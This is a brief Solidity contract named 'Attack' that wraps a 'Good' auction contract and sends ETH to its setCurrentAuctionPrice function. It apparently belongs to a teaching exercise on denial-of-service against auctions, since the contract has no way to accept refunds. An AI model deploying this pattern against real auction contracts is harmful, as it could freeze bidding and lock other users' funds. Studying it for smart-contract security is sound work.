// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import './Good.sol';

contract Attack{
    Good good;
    constructor(Good _good){
        good=_good;
    }

    function attack() public payable {
        good.setCurrentAuctionPrice{value: msg.value}();
    }
}